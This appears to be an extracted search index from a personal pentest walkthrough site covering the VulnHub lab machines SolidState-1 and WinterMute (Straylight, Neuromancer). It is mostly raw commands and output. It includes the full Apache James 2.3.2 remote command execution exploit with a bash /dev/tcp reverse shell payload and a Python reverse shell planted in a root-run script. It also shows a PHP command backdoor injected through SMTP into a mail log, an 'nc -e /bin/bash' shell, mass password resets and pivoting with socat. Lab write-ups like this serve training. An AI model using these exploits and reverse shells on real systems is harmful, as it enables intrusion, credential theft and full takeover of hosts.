/usr/share/seclists/Discovery/Web-Content/common.txt [ + ] Negative Status codes: 404 [ + ] User Agent: gobuster/3.1.0 [ + ] Timeout: 10s =============================================================== 2021 /03/16 09 :34:06 Starting gobuster in directory enumeration mode =============================================================== /.hta ( Status: 403 ) [ Size: 293 ] /.htpasswd ( Status: 403 ) [ Size: 298 ] /.htaccess ( Status: 403 ) [ Size: 298 ] /assets ( Status: 301 ) [ Size: 317 ] [ --> http://192.168.11.141/assets/ ] /images ( Status: 301 ) [ Size: 317 ] [ --> http://192.168.11.141/images/ ] /index.html ( Status: 200 ) [ Size: 7776 ] /server-status ( Status: 403 ) [ Size: 302 ] =============================================================== 2021 /03/16 09 :34:07 Finished =============================================================== [+] All URLs < title > Home - Solid State Security </ title > < link rel = \"stylesheet\" href = \"assets/css/main.css\" /> <!--[if lte IE 9]><link rel=\"stylesheet\" href=\"assets/css/ie9.css\" /><![endif]--> <!--[if lte IE 8]><link rel=\"stylesheet\" href=\"assets/css/ie8.css\" /><![endif]--> < h1 >< a href = \"index.html\" > Solid State Security </ a ></ h1 > < a href = \"#menu\" > Menu </ a > < li >< a href = \"index.html\" > Home </ a ></ li > < li >< a href = \"services.html\" > Services </ a ></ li > < li >< a href = \"about.html\" > About Us </ a ></ li > < a href = \"#\" class = \"close\" > Close </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic01.jpg\" alt = \"\" /></ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic02.jpg\" alt = \"\" /></ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic03.jpg\" alt = \"\" /></ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic04.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic05.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic06.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic07.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < li >< a href = \"services.html\" class = \"button\" > Browse All </ a ></ li > < li class = \"fa-envelope\" >< a href = \"#\" > webadmin@solid-state-security.com </ a ></ li >","title":"Web Application"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#james-server","text":"SMTP nmap 192.168.11.141 -p25 --script=smtp-* Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 09:33 EDT Nmap scan report for 192.168.11.141 Host is up (0.00032s latency). PORT STATE SERVICE 25/tcp open smtp |_smtp-commands: solidstate Hello nmap.scanme.org (192.168.11.140 [192.168.11.140]), PIPELINING, ENHANCEDSTATUSCODES, | smtp-enum-users: |_ root |_smtp-open-relay: Server is an open relay (4/16 tests) | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE MAC Address: 00:0C:29:E1:D2:9B (VMware) Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds JAMES Remote Admin Using JAMES Service, I tried the default credentials of JAMES Remote Admin root:root and gained the access. \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[1.0:15.8]~ \u2514\u2500$ nc -nv 192.168.11.141 4555 (UNKNOWN) [192.168.11.141] 4555 (?) open JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands","title":"JAMES Server"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#mailbox-to-ssh-credential","text":"In the JAMES Remote Admin, I changed all user's passwd to 123456. listusers Existing accounts 6 user: james user: thomas user: john user: mindy user: mailadmin setpassword james 123456 Password for james reset setpassword thomas 123456 Password for thomas reset setpassword john 123456 Password for john reset setpassword mindy 123456 Password for mindy reset setpassword mailadmin 123456 Password for mailadmin reset Revew mailbox and gather more information. script \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.4:30.2]~/bash-script/mailbox \u2514\u2500$ python mailbox.py 192.168.11.141 MailBox: james +OK 0 0 MailBox: thomas +OK 0 0 MailBox: john +OK 1 743 Mail: 1 1 743 . +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for <john@localhost>; Tue, 22 Aug 2017 13:16:20 -0400 (EDT) Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James . MailBox: mindy +OK 2 1945 Mail: 1 1 1109 2 836 . +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for <mindy@localhost>; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . Mail: 2 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for <mindy@localhost>; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James . MailBox: mailadmin +OK 0 0 james \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.7 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 1 \u2a2f +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user james +OK pass 123456 +OK Welcome james list +OK 0 0 . quit +OK Apache James POP3 Server signing off. thomas \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user thomas +OK pass 123456 +OK Welcome thomas list +OK 0 0 . quit +OK Apache James POP3 Server signing off. john \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user john +OK pass 123456 +OK Welcome john list +OK 1 743 1 743 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 9564574 .1.1503422198108.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 581 for <john@localhost> ; Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy ' s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James . quit +OK Apache James POP3 Server signing off. mindy \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user mindy +OK pass 123456 +OK Welcome mindy list +OK 2 1945 1 1109 2 836 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 5420213 .0.1503422039826.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 798 for <mindy@localhost> ; Tue, 22 Aug 2017 13 :13:42 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :13:42 -0400 ( EDT ) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . retr 2 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 16744123 .2.1503422270399.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 581 for <mindy@localhost> ; Tue, 22 Aug 2017 13 :17:28 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :17:28 -0400 ( EDT ) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James . quit +OK Apache James POP3 Server signing off. mailadmin \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user mailadmin +OK pass 123456 +OK Welcome mailadmin list +OK 0 0 . quit +OK Apache James POP3 Server signing off. At here, I had a ssh credential mindy:P@55W0rd1!2@ ssh mindy@192.168.11.141","title":"Mailbox to SSH credential"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#privilege-escalation","text":"","title":"Privilege escalation"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#james-server-rce-to-bypass-retrict-bash","text":"\u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 0 .6:16.0 ] ~ \u2514\u2500$ searchsploit JAMES 2 .3.2 ------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------- --------------------------------- Apache James Server 2 .3.2 - Insecure User Creation Arbitrary File Write | linux/remote/48130.rb Apache James Server 2 .3.2 - Remote Command Execution | linux/remote/35513.py ------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploit linux/remote/35513.py need a user login to the system to run the payload. Modify and execute poc Change payload to execute reverse shell payload = 'bash -i >& /dev/tcp/192.168.11.140/8080 0>&1' # to exploit on any user Open listener and execute payload sudo nc -nvlp 8080 python 35513 .py 192 .168.11.141 ssh mindy@192.168.11.141 35513.py #!/usr/bin/python # # Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution # Date: 16\\10\\2014 # Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec # Vendor Homepage: http://james.apache.org/server/ # Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip # Version: Apache James Server 2.3.2 # Tested on: Ubuntu, Debian # Info: This exploit works on default installation of Apache James Server 2.3.2 # Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d import socket import sys import time # specify payload payload = 'bash -i >& /dev/tcp/192.168.11.140/8080 0>&1' # to exploit on any user # payload = '[ \"$(id -u)\" == \"0\" ] && touch /root/proof.txt' # to exploit only on root # credentials to James Remote Administration Tool (Default - root/root) user = 'root' pwd = 'root' if len ( sys . argv ) != 2 : sys . stderr . write ( \"[-]Usage: python %s <ip> \\n \" % sys . argv [ 0 ]) sys . stderr . write ( \"[-]Exemple: python %s 127.0.0.1 \\n \" % sys . argv [ 0 ]) sys . exit ( 1 ) ip = sys . argv [ 1 ] def recv ( s ): s . recv ( 1024 ) time . sleep ( 0.2 ) try : print \"[+]Connecting to James Remote Administration Tool...\" s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( ip , 4555 )) s . recv ( 1024 ) s . send ( user + \" \\n \" ) s . recv ( 1024 ) s . send ( pwd + \" \\n \" ) s . recv ( 1024 ) print \"[+]Creating user...\" s . send ( \"adduser ../../../../../../../../etc/bash_completion.d exploit \\n \" ) s . recv ( 1024 ) s . send ( \"quit \\n \" ) s . close () print \"[+]Connecting to James SMTP server...\" s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( ip , 25 )) s . send ( \"ehlo team@team.pl \\r\\n \" ) recv ( s ) print \"[+]Sending payload...\" s . send ( \"mail from: <'@team.pl> \\r\\n \" ) recv ( s ) # also try s.send(\"rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\\r\\n\") if the recipient cannot be found s . send ( \"rcpt to: <../../../../../../../../etc/bash_completion.d> \\r\\n \" ) recv ( s ) s . send ( \"data \\r\\n \" ) recv ( s ) s . send ( \"From: team@team.pl \\r\\n \" ) s . send ( \" \\r\\n \" ) s . send ( \"' \\n \" ) s . send ( payload + \" \\n \" ) s . send ( \" \\r\\n . \\r\\n \" ) recv ( s ) s . send ( \"quit \\r\\n \" ) recv ( s ) s . close () print \"[+]Done! Payload will be executed once somebody logs in.\" except : print \"Connection failed.\"","title":"James server RCE to bypass retrict bash"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#using-pspy-to-monitor-process","text":"All user can read, write, modify file tmp.py ${ debian_chroot :+( $debian_chroot ) } mindy@solidstate:~$ ls -l /opt/tmp.py ls -l /opt/tmp.py -rwxrwxrwx 1 root root 105 Aug 22 2017 /opt/tmp.py Create reverse shell python and replace file tmp.py import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"192.168.11.140\" , 4242 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); import pty ; pty . spawn ( \"/bin/bash\" ) I'M ROOT!","title":"Using pspy to monitor process"},{"location":"walkthrough/vulnhub/Wintermute-1-Neuromancer/index.html","text":"VulnHub WinterMute: 1 (Neuromancer) Author: Hades - LeeCyberSec Scripting here VM Details Name WinterMute: 1 Date release 5 Jul 2018 Author creosote Series WinterMute Information Gathering Openning Services After get root at WinterMute: 1 (Straylight) I enum the network and saw that there are 2 interfaces enp0s3 and enp0s8 . root@straylight:/tmp# ifconfig enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.56.102 netmask 255.255.255.0 broadcast 192.168.56.255 <snip> enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.107.106 netmask 255.255.255.0 broadcast 192.168.107.255 <snip> <snip> Poc code here root@straylight:/tmp# bash pingSweeping.sh 192.168.107 192.168.107.2 192.168.107.1 192.168.107.106 192.168.107.107 Scan open port in 192.168.107.107 with nc . root@straylight:/tmp# nc -nv -w 1 -z 192 .168.107.107 1 -65535 ( UNKNOWN ) [ 192 .168.107.107 ] 34483 ( ? ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8080 ( http-alt ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8009 ( ? ) open Port Tunneling I used socat to redirect port 8080,8009,34483 conenctions to 192.168.107.107 root@straylight:/tmp# socat TCP-LISTEN:8080,fork TCP:192.168.107.107:8080 & [1] 8283 root@straylight:/tmp# socat TCP-LISTEN:8009,fork TCP:192.168.107.107:8009 & [2] 8449 root@straylight:/tmp# socat TCP-LISTEN:34483,fork TCP:192.168.107.107:34483 & [3] 8458 root@straylight:/tmp# Enum Service \u250c\u2500\u2500(Hades\u327f192.168.56.110)-[1.5:39.9]~/scripting \u2514\u2500$ sudo ./enum/all.sh 192.168.56.102 8080,8009,34483 [sudo] password for kali: ### Enum ports from input: 8080,8009,34483 ### Services Enumeration ############################ nmap -sC -sV -Pn 192.168.56.102 -p8080,8009,34483 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-30 12:50 EDT Nmap scan report for 192.168.56.102 Host is up (0.00054s latency). PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) |_ajp-methods: Failed to get a valid response for the OPTION request 8080/tcp open http Apache Tomcat 9.0.0.M26 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.0.M26 34483/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2e:9b:4a:a9:c0:fc:0b:d8:ef:f1:e3:9d:f4:59:25:32 (RSA) | 256 f6:2a:de:07:36:36:00:e9:b5:5d:2f:aa:03:79:91:d1 (ECDSA) |_ 256 38:3c:a8:ed:91:ea:ce:1d:0d:0f:ab:51:ac:97:c8:fb (ED25519) MAC Address: 08:00:27:0E:1B:0D (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.89 seconds","title":"Wintermute: 1 (Neuromancer)"},{"location":"walkthrough/vulnhub/Wintermute-1-Neuromancer/index.html#vulnhub-wintermute-1-neuromancer","text":"Author: Hades - LeeCyberSec Scripting here","title":"VulnHub WinterMute: 1 (Neuromancer)"},{"location":"walkthrough/vulnhub/Wintermute-1-Neuromancer/index.html#vm-details","text":"Name WinterMute: 1 Date release 5 Jul 2018 Author creosote Series WinterMute","title":"VM Details"},{"location":"walkthrough/vulnhub/Wintermute-1-Neuromancer/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/vulnhub/Wintermute-1-Neuromancer/index.html#openning-services","text":"After get root at WinterMute: 1 (Straylight) I enum the network and saw that there are 2 interfaces enp0s3 and enp0s8 . root@straylight:/tmp# ifconfig enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.56.102 netmask 255.255.255.0 broadcast 192.168.56.255 <snip> enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.107.106 netmask 255.255.255.0 broadcast 192.168.107.255 <snip> <snip> Poc code here root@straylight:/tmp# bash pingSweeping.sh 192.168.107 192.168.107.2 192.168.107.1 192.168.107.106 192.168.107.107 Scan open port in 192.168.107.107 with nc . root@straylight:/tmp# nc -nv -w 1 -z 192 .168.107.107 1 -65535 ( UNKNOWN ) [ 192 .168.107.107 ] 34483 ( ? ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8080 ( http-alt ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8009 ( ? ) open","title":"Openning Services"},{"location":"walkthrough/vulnhub/Wintermute-1-Neuromancer/index.html#port-tunneling","text":"I used socat to redirect port 8080,8009,34483 conenctions to 192.168.107.107 root@straylight:/tmp# socat TCP-LISTEN:8080,fork TCP:192.168.107.107:8080 & [1] 8283 root@straylight:/tmp# socat TCP-LISTEN:8009,fork TCP:192.168.107.107:8009 & [2] 8449 root@straylight:/tmp# socat TCP-LISTEN:34483,fork TCP:192.168.107.107:34483 & [3] 8458 root@straylight:/tmp#","title":"Port Tunneling"},{"location":"walkthrough/vulnhub/Wintermute-1-Neuromancer/index.html#enum-service","text":"\u250c\u2500\u2500(Hades\u327f192.168.56.110)-[1.5:39.9]~/scripting \u2514\u2500$ sudo ./enum/all.sh 192.168.56.102 8080,8009,34483 [sudo] password for kali: ### Enum ports from input: 8080,8009,34483 ### Services Enumeration ############################ nmap -sC -sV -Pn 192.168.56.102 -p8080,8009,34483 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-30 12:50 EDT Nmap scan report for 192.168.56.102 Host is up (0.00054s latency). PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) |_ajp-methods: Failed to get a valid response for the OPTION request 8080/tcp open http Apache Tomcat 9.0.0.M26 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.0.M26 34483/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2e:9b:4a:a9:c0:fc:0b:d8:ef:f1:e3:9d:f4:59:25:32 (RSA) | 256 f6:2a:de:07:36:36:00:e9:b5:5d:2f:aa:03:79:91:d1 (ECDSA) |_ 256 38:3c:a8:ed:91:ea:ce:1d:0d:0f:ab:51:ac:97:c8:fb (ED25519) MAC Address: 08:00:27:0E:1B:0D (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.89 seconds","title":"Enum Service"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html","text":"VulnHub WinterMute: 1 (Straylight) Author: Hades - LeeCyberSec Scripting here VM Details Name WinterMute: 1 Date release 5 Jul 2018 Author creosote Series WinterMute Information Gathering Openning Services To scan all open ports in WinterMute I run nmap with -p- options and enum service at each port. \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 3 .4:37.2 ] ~/scripting \u2514\u2500$ sudo ./enum/all.sh 192 .168.56.102 ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 192 .168.56.102 | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [ + ] Openning ports: 25 ,80,3000 ### Services Enumeration ############################ nmap -sC -sV -Pn 192 .168.56.102 -p25,80,3000 <snip> PORT STATE SERVICE VERSION 25 /tcp open smtp Postfix smtpd | _smtp-commands: straylight, PIPELINING, SIZE 10240000 , VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | ssl-cert: Subject: commonName = straylight | Subject Alternative Name: DNS:straylight | Not valid before: 2018 -05-12T18:08:02 | _Not valid after: 2028 -05-09T18:08:02 | _ssl-date: TLS randomness does not represent time 80 /tcp open http Apache httpd 2 .4.25 (( Debian )) | _http-server-header: Apache/2.4.25 ( Debian ) | _http-title: Night City 3000 /tcp open hadoop-datanode Apache Hadoop | hadoop-datanode-info: | _ Logs: submit | hadoop-tasktracker-info: | _ Logs: submit | http-title: Welcome to ntopng | _Requested resource was /lua/login.lua?referer = / | _http-trane-info: Problem with XML parsing of /evox/about MAC Address: 08 :00:27:0E:1B:0D ( Oracle VirtualBox virtual NIC ) Service Info: Host: straylight Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done : 1 IP address ( 1 host up ) scanned in 20 .67 seconds Postfix smtpd ### SMTP Enumeration (25) ############################ <snip> PORT STATE SERVICE 25 /tcp open smtp | _smtp-commands: straylight, PIPELINING, SIZE 10240000 , VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | smtp-enum-users: | _ Method RCPT returned a unhandled status code. | _smtp-open-relay: Server doesn ' t seem to be an open relay, all tests failed | smtp-vuln-cve2010-4344: | _ The SMTP server is not Exim: NOT VULNERABLE MAC Address: 08 :00:27:0E:1B:0D ( Oracle VirtualBox virtual NIC ) Nmap done : 1 IP address ( 1 host up ) scanned in 31 .68 seconds Using nc to access to smtp service and run some common commands. In here, we can sent a mail without authentication. \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 4 .2:41.3 ] ~/scripting \u2514\u2500$ nc -nC 192 .168.56.102 25 220 straylight ESMTP Postfix ( Debian/GNU ) vrfy root 252 2 .0.0 root mail from: \"root@localhost\" 250 2 .1.0 Ok rcpt to: \"root\" 250 2 .1.5 Ok data 354 End data with <CR><LF>.<CR><LF> root . 250 2 .0.0 Ok: queued as 3674F5516 Apache httpd 2.4.25 Brower to the web application and get some messages in hone page, after that, the website redirect to www.html and sent another messages. [+] Files and directories gobuster dir -k -u http://192.168.56.102:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> =============================================================== /manual ( Status: 301 ) [ Size: 317 ] [ --> http://192.168.56.102/manual/ ] /freeside ( Status: 301 ) [ Size: 319 ] [ --> http://192.168.56.102/freeside/ ] /server-status ( Status: 403 ) [ Size: 302 ] <snip> [+] All URLs curl -k http://192.168.56.102:80 -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' <link rel = \"stylesheet\" href = \"gl.css\" > <title>Night City</title> Apache Hadoop ntopng At ntopng Web GUI , I know that the default login is admin:admin . Try it and get admin page. Go to http://192.168.56.102:3000/lua/flows_stats.lua , there is a url /turing-bolo/ . There are content at file case.log via url http://192.168.56.102/turing-bolo/bolo.php?bolo=case Local File Inclusion Web application auto add .log after the provided value. I find some log in the Kali Machine to trying access it in the server with payload bolo=../../../../../../var/log/apt/history \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 4 .6:23.8 ] ~/scripting \u2514\u2500$ find / -name *.log 2 > /dev/null <snip> /var/log/apt/history.log /var/log/dpkg.log Foothold Postfix mail log file backdoor I used Postfix SMTP and sent a email with php backdoor Poc code here \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 3 .0:40.9 ] ~/scripting \u2514\u2500$ nc -nC 192 .168.56.102 25 220 straylight ESMTP Postfix ( Debian/GNU ) mail from: \"hades <?php system( $_GET ['cmd']); ?> hades\" 250 2 .1.0 Ok rcpt to: \"root@localhost\" 250 2 .1.5 Ok data 354 End data with <CR><LF>.<CR><LF> . 250 2 .0.0 Ok: queued as D4E985515 quit 221 2 .0.0 Bye Go to Postfix mail log file /var/log/mail curl -v --silent \"http://192.168.56.102/turing-bolo/bolo.php?bolo=/var/log/mail&cmd= $cmd \" 2 > & 1 | sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' uid = 33 ( www-data ) gid = 33 ( www-data ) groups = 33 ( www-data ) Getting reverse shell hURL -U 'nc -nv 192.168.56.110 4444 -e /bin/bash' cmd = 'nc%20-nv%20192.168.56.110%204444%20-e%20%2Fbin%2Fbash' curl -v --silent \"http://192.168.56.102/turing-bolo/bolo.php?bolo=/var/log/mail&cmd= $cmd \" 2 > & 1 | sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' sudo nc -nvlp 4444 Privilege escalation Upgrade shell /usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" export TERM = xterm ^Z stty raw -echo ; fg Binaries That AutoElevate www-data@straylight:/tmp$ find / -perm -u = s -type f 2 >/dev/null /bin/su /bin/umount /bin/mount /bin/screen-4.5.0 <snip> www-data@straylight:/tmp$ GNU Screen 4.5.0 exploit \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 1 .4:23.7 ] ~ \u2514\u2500$ searchsploit screen 4 .5.0 --------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------- --------------------------------- GNU Screen 4 .5.0 - Local Privilege Escalation | linux/local/41154.sh GNU Screen 4 .5.0 - Local Privilege Escalation ( PoC ) | linux/local/41152.txt --------------------------------------------------------- --------------------------------- Shellcodes: No Results At /tmp in the unix machine, I create 2 file libhax.c rootshell.c and run poc.sh to get root. Poc code here bash poc.sh 2 > /dev/null Post Exploitation Enum network, there are 2 interfaces enp0s3 and enp0s8 root@straylight:/tmp# ifconfig enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.56.102 netmask 255.255.255.0 broadcast 192.168.56.255 inet6 fe80::a00:27ff:fe0e:1b0d prefixlen 64 scopeid 0x20<link> ether 08:00:27:0e:1b:0d txqueuelen 1000 (Ethernet) RX packets 498352 bytes 66009694 (62.9 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 408318 bytes 173600084 (165.5 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.107.106 netmask 255.255.255.0 broadcast 192.168.107.255 inet6 fe80::a00:27ff:fec0:db47 prefixlen 64 scopeid 0x20<link> ether 08:00:27:c0:db:47 txqueuelen 1000 (Ethernet) RX packets 244 bytes 34210 (33.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 45 bytes 7450 (7.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 <snip> Poc code here root@straylight:/tmp# bash pingSweeping.sh 192.168.107 192.168.107.2 192.168.107.1 192.168.107.106 192.168.107.107 Scan open port in 192.168.107.107 with nc . root@straylight:/tmp# nc -nv -w 1 -z 192 .168.107.107 1 -65535 ( UNKNOWN ) [ 192 .168.107.107 ] 34483 ( ? ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8080 ( http-alt ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8009 ( ? ) open WinterMute: 1 (Neuromancer)","title":"Wintermute: 